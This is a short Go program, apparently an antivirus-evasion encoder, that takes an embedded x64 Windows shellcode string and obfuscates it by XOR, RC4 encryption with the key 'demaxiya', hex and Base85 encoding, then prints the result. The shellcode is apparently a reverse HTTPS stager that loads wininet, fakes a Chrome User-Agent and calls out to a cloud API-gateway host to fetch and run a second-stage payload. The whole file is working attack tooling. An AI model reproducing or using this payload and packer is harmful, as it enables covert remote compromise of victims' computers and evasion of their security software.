package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"

	"github.com/eknkc/basex"
)

func main() {
	key := []byte("demaxiya")
	message := "\xfc\x48\x83\x51\x41\x50\x52\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x73\x65\x6e\x73\x6f\x72\x73\x2d\x6d\x69\x6e\x2e\x6a\x73\x00\xad\x9f\x0a\x64\x84\x83\x4b\xd1\xbf\x8e\x8c\xfc\x96\xa1\xf2\x91\x48\xca\x69\xe1\x01\xfe\x55\xfd\xc6\x5d\xab\xda\x53\x45\x6e\x8f\xc3\x40\xb7\xaf\xee\x97\xf3\xee\xc9\xce\xc3\x26\x9d\x37\xb3\x28\x8b\xbf\xf8\xfa\x7f\x2a\x1a\x93\x35\x49\xbb\x2c\x41\x19\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x39\x30\x2e\x30\x2e\x34\x34\x33\x30\x2e\x32\x31\x32\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x0d\x0a\x00\x26\xbb\x98\xd0\x77\x64\x50\x79\x5f\xb4\x16\x6c\x26\x44\x45\xdd\x66\xc0\xeb\x97\x21\x60\xc8\x5d\x41\x8b\x61\xd2\xa2\x60\xa7\x31\x04\x30\x24\xe4\x76\x99\x6a\x96\xa9\x60\xc3\xcb\xca\xf5\xdf\x6f\x4e\x2c\xa8\xb5\x09\xea\xdf\x14\x65\xd6\x24\x5b\xbd\x64\x44\x59\x12\xfc\x68\x46\xe1\xbb\xf5\x8d\x0a\x5a\xe9\x06\xd6\xa7\x16\x03\xce\x57\xda\x89\x0d\xcf\x8a\xe3\x93\x3b\x93\xb2\xb0\xbf\x18\xb9\x46\x83\x9e\x32\xea\x5c\x5a\x36\x27\x07\x27\x2d\xad\x35\x55\xc7\x0c\x88\x7e\xfc\xd7\x08\x22\x28\x5a\x0c\x7f\x9f\xb0\x4e\x95\x66\xa1\xfd\x06\xdb\xea\xb4\x8f\x7c\xfe\xf5\x7a\x8b\x4d\x0f\x9a\xcc\x98\x60\x9b\x71\x94\x8f\x38\xbd\x07\x30\x42\x71\x57\xdc\x5d\x6e\x6d\x57\xfe\x2c\x91\x02\xce\xd2\x4a\xd9\x72\xe3\x41\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x73\x65\x72\x76\x69\x63\x65\x2d\x6a\x63\x65\x72\x39\x71\x6f\x78\x2d\x31\x33\x30\x37\x37\x30\x30\x38\x31\x38\x2e\x73\x68\x2e\x61\x70\x69\x67\x77\x2e\x74\x65\x6e\x63\x65\x6e\x74\x63\x73\x2e\x63\x6f\x6d\x00\x05\xf5\xe1\x00"

	// XOR 操作
	xordMessage := make([]byte, len(message))
	for i := 0; i < len(message); i++ {
		xordMessage[i] = message[i] ^ 0xff
	}

	// RC4 加密
	cipher, _ := rc4.NewCipher(key)
	rc4Message := make([]byte, len(xordMessage))
	cipher.XORKeyStream(rc4Message, xordMessage)

	// 转为十六进制
	hexCiphertext := make([]byte, hex.EncodedLen(len(rc4Message)))
	n := hex.Encode(hexCiphertext, rc4Message)
	hexCiphertext = hexCiphertext[:n]

	// Base85 编码
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	encodedMessage := base85.Encode([]byte(hexCiphertext))

	fmt.Println(encodedMessage)
}
